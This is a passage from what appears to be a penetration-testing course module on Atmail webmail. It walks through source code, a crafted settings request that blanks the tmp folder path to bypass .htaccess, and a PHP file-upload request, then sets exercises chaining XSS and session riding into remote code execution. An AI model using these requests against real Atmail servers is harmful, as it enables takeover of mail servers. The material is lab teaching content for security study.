171:            if( !is_dir(APP_ROOT . $tmp_dir) )
172:                throw new Exception('Failure creating folders in tmp directory. Web server user must own ' . $tmp_dir . ' and sub folders and have access permissions');
173:            
174:        }
175:        $tmp_dir .= $accountSecondLetter . DIRECTORY_SEPARATOR;
176:        if( !is_dir(APP_ROOT . $tmp_dir) )
177:        {
178:            
179:            @mkdir(APP_ROOT . $tmp_dir);
180:            if( !is_dir(APP_ROOT . $tmp_dir) )
181:                throw new Exception('Failure creating folders in tmp directory. Web server user must own ' . $tmp_dir . ' and sub folders and have access permissions');
182:            
183:        }
184:        $tmp_dir .= $safeUser . DIRECTORY_SEPARATOR;
185:        if( !is_dir(APP_ROOT . $tmp_dir) )
186:        {
187:            
188:            @mkdir(APP_ROOT . $tmp_dir);
189:            if( !is_dir(APP_ROOT . $tmp_dir) )
190:                throw new Exception('Failure creating folders in tmp directory. Web server user must own ' . $tmp_dir . ' and sub folders and have access permissions');
191:            
192:        }
193:        
194:        if( $subFolder != '' ) 
195:        {
196: 
197:            $tmp_dir .= $subFolder . DIRECTORY_SEPARATOR;
198:            if( !is_dir(APP_ROOT . $tmp_dir) )
199:            {
200:            
201:                @mkdir(APP_ROOT . $tmp_dir);
202:                if( !is_dir(APP_ROOT . $tmp_dir) )
203:                    throw new Exception('Failure creating folders in tmp directory. Web server user must own ' . $tmp_dir . ' and sub folders and have access permissions');
204:                
205:            }
206: 
207:        }
208:        if( is_dir(APP_ROOT . $tmp_dir) )
209:            return $tmp_dir;
210:        else
211:            throw new Exception('Unable to create tmp user folder (check correct permissions for tmp folders): ' . $tmp_dir);
212: 
213:    }
Listing 22 - getTmpFolder function implementation

Although a bit intimidating at first glance, this function is fairly easy to follow for our purposes.

First of all, the APP_ROOT directory that shows up everywhere in this function is initially defined during the installation in server-install.php to /usr/local/atmail/webmail/ (Listing 23).

[atmail@atmail atmail]$ pwd
/usr/local/atmail
[atmail@atmail atmail]$ cat server-install.php | grep APP_ROOT
define('APP_ROOT', dirname(__FILE__) . DIRECTORY_SEPARATOR . 'webmail' . DIRECTORY_SEPARATOR);
require_once(APP_ROOT . 'library/Atmail/Utility.php');
require_once(APP_ROOT . 'library/Atmail/Install/Strings.php');
require_once(APP_ROOT . 'library/Atmail/General.php');
require_once(APP_ROOT . 'library/Atmail/Deps/DepCheck.php');
require_once(APP_ROOT . 'library/Atmail/Apache_Utility.php');
Listing 23 - APP_ROOT is defined in /usr/local/atmail/server-install.php

On line 130 in Listing 22, we can see that the directory variable tmp_dir is obtained from the global configuration variable tmpFolderBaseName. A quick search through the Atmail PHP files revealed that the tmpFolderBaseName value is stored in the database and its default value is set to tmp/ during the installation process through a script named /usr/local/atmail/webmail/install/atmail6-default-config.sql (Listing 24).

INSERT IGNORE INTO `Config` (`section`, `keyName`, `keyValue`, `keyType`) VALUES ('exim', 'enableMailFilters', '1', 'Boolean'),
('exim', 'smtp_load_queue', '10', 'String'),
('exim', 'virus_enable', '1', 'Boolean'),
('exim', 'smtp_sendlimit_enable', '1', 'Boolean'), ('exim', 'smtp_sendlimit', '50', 'String'), ('exim', 'dkim_enable', '0', 'Boolean'),
...
('global', 'tmpFolderBaseName', 'tmp/', 'String'),
Listing 24 - Contents of atmail-6-default-config.sql

Then on line 137 of Listing 22, the safeUser variable is created using the username of the user triggering the execution of this code, i.e. the Atmail user trying to send an attachment. Before being used, the username is "stripped" through the use of the simplifyString function (Listing 25), which just removes special characters from the string content.

/**
 * simplify user account names for use in tmp folder creation, caching etc.
 * ZF Caching functionality will only accept simple cache filename hash names (without @)
 * @return simplified string
*/
function simplifyString($string)
{

        return preg_replace("/[^a-zA-Z0-9]/", "", $string);

}

Listing 25 - The simplifyString function is located in /usr/local/atmail/webmail/library/Atmail/General.php

Lines 150 and 151 in Listing 22 show that the first and second characters of the username are extracted and later concatenated into a folder path. If the folders do not exist, the code creates them. This logic can be seen in lines 166, 170, 175, 179, 184, and 188 of Listing 22 respectively.

Looking back to the addattachmentAction function, and based on what we have learned from the getTmpFolder function, we can conclude that the final upload path that is created for any attachments uploaded by the admin@offsec.local user is:

/usr/local/atmail/webmail/tmp/a/d/adminoffseclocal/ 
Listing 26 - The path to where the file will be uploaded to within the web root

As we can see, this path is clearly located within the web root. If any PHP files are uploaded here, we can potentially gain remote code execution by accessing them within the tmp</span> directory, or any subdirectories.

However, we still have a problem we need to overcome. If we look at the file system of our Atmail server, we discover that the parent upload directory (/usr/local/atmail/webmail/tmp) contains a .htaccess file by default. A .htaccess file is an access configuration file used by the Apache web server to control how requests are handled on a per-directory basis.2 More importantly, as it stands now, the .htaccess configuration will deny all HTTP requests for any file within (Listing 27).

[atmail@atmail ~]$ cat /usr/local/atmail/webmail/tmp/.htaccess
order deny, allow
deny from all 
Listing 27 - A .htaccess blocking our HTTP requests to files in this folder

Let's recap quickly. We can potentially upload any PHP file of our choice by crafting a session riding attack similar to the one performed previously. This could be done by forcing the victim to send an email containing an attachment processed by the addattachmentAction function.

The temporary folder path where the attachment would be stored is predictable and within the application web root, as we saw from the getTmpFolder implementation. However, the .htaccess file stored in the tmp directory would block the requests to our malicious uploaded PHP file.

So, how are we going to defeat the .htaccess file protection?

1
(PHP Group, 2020), http://www.php.net/manual/en/reserved.variables.files.php, http://us3.php.net/manual/en/features.file-upload.post-method.php ↩︎

2
(The Apache Software Foundation, 2020), https://httpd.apache.org/docs/2.4/howto/htaccess.html ↩︎

16.4.3. The globalsaveAction Vulnerability Analysis
In the previous section, we learned that tmpFolderBaseName is set in the database through the /usr/local/atmail/webmail/install/atmail6-default-config.sql script. By looking at the other content of this file, we realized that at least some of the variables set there during the installation can be changed via the Atmail administrative web interface settings (Figure 15).

Figure 15: Atmail global settings
Figure 15: Atmail global settings
In the web UI, we do not see a way to update the temporary directory path directly, but the existence of this update mechanism suggests that it may be possible to make a change to tmpFolderBaseName via a specially crafted request.

Why is this important? Let’s take a look at the file system.

The default value of the tmpFolderBaseName setting is tmp/. When concatenated with the web root, it is:

/usr/local/atmail/webmail/tmp/
Listing 28 - tmpFolderBaseName used in the webroot

In the previous section, we described how this setting is used as part of the path destination for a file upload. If we update the tmpFolderBaseName setting to an empty string value, we will effectively move the upload parent folder one level up to the webmail directory.

/usr/local/atmail/webmail
Listing 29 - A redefined web root path

Even though the difference is very subtle, we can see that the webmail directory does not have a .htaccess file and that it is writable by the Atmailwebserver user:

[atmail@atmail ~]$ ps aux |grep httpd
atmail    2550  0.0  0.0   4016   672 pts/0    S+   06:34   0:00 grep httpd
root      3444  0.0  1.5  34456 16368 ?        Ss   Oct31   0:00 /usr/sbin/httpd
atmail   13467  0.0  0.8  34456  8896 ?        S    Nov11   0:00 /usr/sbin/httpd
atmail   13468  0.0  0.8  34456  8896 ?        S    Nov11   0:00 /usr/sbin/httpd
...
[atmail@atmail ~]$ ls -la /usr/local/atmail
total 140
...
...
drwxr-xr-x 29 atmail atmail  4096 Mar  8  2012 users
drwxr-xr-x 17 atmail atmail  4096 May 17 18:17 webmail
[atmail@atmail ~]$ cat /usr/local/atmail/webmail/.htaccess 
cat: /usr/local/atmail/webmail/.htaccess: No such file or directory 
Listing 30 - No .htaccess in webmail and the directory is writable!

In other words, if we are able to change the global setting as described, we can avoid the restrictions imposed by the .htaccess file located in the original tmp/ directory!

Let's proceed by intercepting the POST request issued while saving the global settings from the UI (Listing 31). This will help us find any possible flaws in the code logic.

POST /index.php/admin/settings/globalsave HTTP/1.1
Host: atmail
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: application/json, text/javascript, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://atmail/index.php/admin/index/login
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 834
Cookie: atmail6=9sa5pic6s1sqsa38iqlencctl5; atmail6_admin=hr0e0hv45ce0t2rkjne561sb57
Connection: close

save=1&fields%5Badmin_email%5D=postmaster%40mydomain.com&fields%5Bsession_timeout%5D=120&fields%5Bsql_host%5D=127.0.0.1&fields%5Bsql_user%5D=root&fields%5Bsql_pass%5D=956ec84a45e0675851367c7e480ec0e9&fields%5Bsql_table%5D=atmail6&dovecot%5BauthType%5D=sql&dovecot%5BldapType%5D=openldap&dovecot%5Bldap_bindauth%5D=1&dovecot%5Bldap_host%5D=&dovecot%5Bldap_binddn%5D=&dovecot%5Bldap_bindpass%5D=&dovecot%5Bldap_basedn%5D=&dovecot%5Bldap_passwdfield%5D=&dovecot%5Bldap_passfilter%5D=&dovecot%5Bldap_bindauth%5D=1&dovecot%5Bldap_bindauthdn%5D=cn%3D%25u%2Cdc%3Ddomain%2Cdc%3Dorg&userPasswordEncryptionTypeCurrent=PLAIN&fields%5BuserPasswordEncryptionType%5D=PLAIN&externalUserPasswordEncryptionTypeCurrent=PLAIN&fields%5BexternalUserPasswordEncryptionType%5D=PLAIN&fields%5Bmaster_key%5D=&fields%5Blog_purge_days%5D=180&fields%5Bdebug%5D=0
Listing 31 - A legitimate POST request to save global settings.

As shown in the previous listing, the POST URL indicates that the invoked function name is globalsave.

[atmail@atmail webmail]$ grep -r globalsave *
application/modules/admin/controllers/SettingsController.php:	public function globalsaveAction()</span>
application/modules/admin/views/scripts/settings/global.phtml:		<form id="settingsForm" method="post" action="<?php echo $this->moduleBaseUrl ?>/settings/globalsave">
Listing 32 - Searching for the globalsave function

A search (Listing 32) for this function name within the Atmail PHP files revealed that its implementation is located in /usr/local/atmail/webmail/application/modules/admin/controllers/SettingsController.php. Let's see how the changes to the global settings are implemented:

111:    public function globalsaveAction()
112:    {   
            ...
177:        
178:        // Else, continue as normal if LDAP or SQL
179:        
180:        try
181:        {
182:            
183:            $failure = false;
184:            require_once 'application/models/config.php';
185:                    
186:            //if password unchanged then no change
187:            if( !isset($this->requestParams['fields']['sql_pass']) || $this->requestParams['fields']['sql_pass'] == md5('__UNCHANGED__') )
188:                $this->requestParams['fields']['sql_pass'] = Zend_Registry::get('config')->global['sql_pass'];
189:            
190:            $dbArray =  array(
191:                        'host'     => $this->requestParams['fields']['sql_host'],
192:                        'username' => $this->requestParams['fields']['sql_user'],
193:                        'password' => $this->requestParams['fields']['sql_pass'],
194:                        'dbname'   => $this->requestParams['fields']['sql_table']
195:                    );
196:            
197:            // Attempt connection to SQL server
198:            require_once('library/Zend/Db/Adapter/Pdo/Mysql.php');
199:            try
200:            {
201:                
202:                $db = new Zend_Db_Adapter_Pdo_Mysql($dbArray);
203:                $db->getConnection();
204:                
205:            }
206:            catch (Exception $e)
207:            {
208:                
209:                throw new Atmail_Config_Exception("Unable to connect to the provided SQL server with supplied settings");
210:                
211:            }       
212:            
213:            config::save( 'global', $this->requestParams['fields'] );
Listing 33 - Relevant code in the Settings Controller

For us, the most important items in this file are located on lines 187-188 and 213. As we know, the global settings are saved in a database, which implies that any changes to those settings through the UI also need to be saved to the same database.

The code looks for a HTTP request parameter sql_pass in the fields array, but if that is not set or if it is set to the MD5 hash of the string "__UNCHANGED__" (which is "956ec84a45e0675851367c7e480ec0e9"), it retrieves the database password for us on line 188. This in turn allows us to establish a successful connection to the database at lines 202-203.

Finally, at line 213 we can see a call to the config::save function, implemented in the /usr/local/atmail/webmail/application/models/config.php file at line 11.

11: class config
12: {
13: 
14: 	public static function save($sectionNode, $newConfig)
15: 	{
16: 
17: 		$configObj = Zend_Registry::get('config');
18: 
19: 		//get existing db records.			 
20: 		$dbConfig = Zend_Registry::get('dbConfig');
21: 		$dbAdapter = Zend_Registry::get('dbAdapter');
22: 		$select = $dbAdapter->select()
23: 							->from($dbConfig->database->params->configtable)
24: 							->where("section = " . $dbAdapter->quote($sectionNode));
25: 		$query = $select->query();
26: 		$existingConfig = $query->fetchAll();
27: 		foreach($newConfig as $newKey => $newValue) 
28: 		{
29: 
30: 			//blindly update the config object - just incase used elsewhere then will be updated
31: 			//But unset at the end, so is this redundant
32: 			$configObj->$sectionNode[$newKey] = $newValue;
33: 
34: 			//go through each responce field
35: 			$responseMatchFoundInDb = false;
36: 			foreach($existingConfig as $existingRow) 
37: 			{
38: 
39: 				//go thorugh each db row looking for a match (only update exsting)
40: 				if( $existingRow['keyName'] == $newKey )
41: 				{
42: 
43: 					//update $row then update db  
44: 					//if array remove all and all new
45: 					if( $existingRow['keyType'] == 'Array') 
46: 					{
47: 
48: 						$where = $dbAdapter->quoteinto('`section` = ?', $sectionNode) . ' AND ' . $dbAdapter->quoteinto(' `keyName` = ?', $existingRow['keyName']);
49: 						$result = $dbAdapter->delete($dbConfig->database->params->configtable,$where);
50: 						$newValueArray = explode("\n", $newValue);
51: 						unset($existingRow['configId']);
52: 						foreach( $newValueArray as $v ) 
53: 						{
54: 
55: 							$existingRow['keyValue'] = trim($v);
56: 							// Skip array values with no data ( e.g local domains with a return/\n )
57: 							if( !empty($existingRow['keyValue']) )
58: 							{
59: 								
60: 								$result = $dbAdapter->insert($dbConfig->database->params->configtable,$existingRow);
61: 								
62: 							}
63: 
64: 						}
65: 
66: 					} 
67: 					else if( $existingRow['keyType'] == 'Boolean') 
68: 					{
69: 
70: 						$existingRow['keyValue'] = (in_array( $newValue, array('yes','Yes', 'YES', 1, '1', true, 'true') )?'1':'0');
71: 						$result = $dbAdapter->update($dbConfig->database->params->configtable,$existingRow, $dbAdapter->quoteinto('configId = ?',  $existingRow['configId']) );
72:                         
73: 					}
74: 					else
75: 					{
76: 
77: 						$existingRow['keyValue'] = trim($newValue);
78: 						$result = $dbAdapter->update($dbConfig->database->params->configtable,$existingRow, $dbAdapter->quoteinto('configId = ?',  $existingRow['configId']) );
79: 						
80: 					}
81: 					$responseMatchFoundInDb = true;
82: 					break;
83: 
84: 				}   
85: 
86:  ...
Listing 34 - Implementation of the config::save function in /usr/local/atmail/webmail/application/models/config.php

Listing 34 shows that the code allows us to successfully update any global setting of our choosing since there are no implemented checks on which settings are updated. The function only checks for the existence of the requested field in the database.

In other words, the Atmail developers failed to account for in-transit modification of legitimate requests and assumed that only the intended subset of global settings that is exposed through the web UI could be updated.

Finally, a malicious request to update the temporary folder path would look similar to this:

POST /index.php/admin/settings/globalsave HTTP/1.1 
Host: <atmail> 
Content-Type: application/x-www-form-urlencoded; charset=UTF-8 
Content-Length: 131 
Cookie: atmail6_admin=hr0e0hv45ce0t2rkjne561sb57 
Connection: close

save=1&fields[sql_user]=root&fields[sql_pass]=956ec84a45e0675851367c7e480ec0e9&fields[sql_table]=atmail6&fields[tmpFolderBaseName]= 
Listing 35 - Triggering the settings update

You may notice that in this request, we are using the hard coded MD5 value that we mentioned earlier but keep in mind that it is not required. The only thing we absolutely must have is the admin session cookie.

Also notice how we set tmpFolderBaseName to an empty value in line with our initial plan.

Exercise
Replay the POST request listed in Listing 35 and verify that you can successfully modify global settings. You can verify it by connecting to Atmail via SSH, logging in to the database, and checking the setting.

However, Atmail's SSH server is running an outdated configuration. To connect from Kali, we need to use -o specify Key Exchange and Host Key algorithms available on the server.

kali@kali:~$ ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-dss atmail@atmail
Listing 36 - Sample ssh connection command for Atmail

When logged into the database, run the following SQL statement.

mysql> select * from Config where keyName="tmpFolderBasename";
+----------+---------+-------------------+----------+---------+
| configId | section | keyName           | keyValue | keyType |
+----------+---------+-------------------+----------+---------+
|       92 | global  | tmpFolderBaseName | tmp/     | String  | 
+----------+---------+-------------------+----------+---------+
1 row in set (0.00 sec)

mysql>
Listing 37 - Verifying the default tmpFolderBaseName global setting

After running the attack, re-run the SQL statement. You should have a blank keyValue field.

mysql> select * from Config where keyName="tmpFolderBasename";
+----------+---------+-------------------+----------+---------+
| configId | section | keyName           | keyValue | keyType |
+----------+---------+-------------------+----------+---------+
|       92 | global  | tmpFolderBaseName |          | String  | 
+----------+---------+-------------------+----------+---------+
1 row in set (0.00 sec)

mysql>
Listing 38 - Verifying the attack worked against the tmpFolderBasename global setting

16.4.4. addattachmentAction Vulnerability Trigger
Now that we have changed the appropriate global setting, we can upload any content we choose (such as PHP code) via an email attachment and access it using a URI that we now know we can reach in a browser. The following listing shows a HTTP request for a sent email with a malicious attachment.

POST /index.php/mail/composemessage/addattachment/composeID/ HTTP/1.1 
Host: atmail
Cookie: atmail6=jpln2oq7qpvscg46n6vsgb3ba0
Connection: close 
Content-Type: multipart/form-data; 
boundary=--------------------------- 53835469212916346211645234520
Content-Length: 238 

-----------------------------53835469212916346211645234520 
Content-Disposition: form-data; name="newAttachment"; filename="offsec.php" 
Content-Type: </span>

<?php phpinfo(); ?> 
-----------------------------53835469212916346211645234520-- 
Listing 39 - Uploading PHP code

Note here that the authenticated user is just a normal user. We do not need administrative privileges to perform this attack once the globalsaveAction attack has been completed.

However, assuming that we may not have access to the Atmail system at all, we could use this vulnerability in our session riding payload along with the globalsaveAction vulnerability.

Also note that the Content-Type is set to nothing. We won't go into the reason for this here, but it can be found in Listing 21. We will leave this as a small exercise for you.

After the upload, we are able to reach our injected shell:

/usr/local/atmail/webmail/a/d/adminoffseclocal/--offsec.php
Listing 40 - The location of the uploaded shell

Figure 16: Gaining remote code execution
Figure 16: Gaining remote code execution
Exercise
Take your newly learned vulnerabilities and test them out! Build the complete session riding attack in JavaScript combined with the XSS, addattachment and globalsave vulnerability as previously discussed and gain remote code execution.

Extra Mile
Previously, we talked about an alternative path to remote code execution. That is, via the plugins. Research this and discover the requests that are needed to upload PHP code via this method. Then, use that as your remote code execution payload and combine it with your XSS to achieve a virtually unassisted remote shell on your Atmail target.

16.5. Summary
In this module, we first discovered and then later exploited an XSS vulnerability in the Atmail Server.

We showed how this vulnerability is triggered when a user views their inbox.

We then combined it with a post-authenticated payload that will send an email on behalf of the administrator to any user, essentially spoofing the administrator.

Finally, we walked through a file upload vulnerability so that you can build an end-to-end exploit combining all the vulnerabilities that will result in remote code execution and compromise the underlying server.


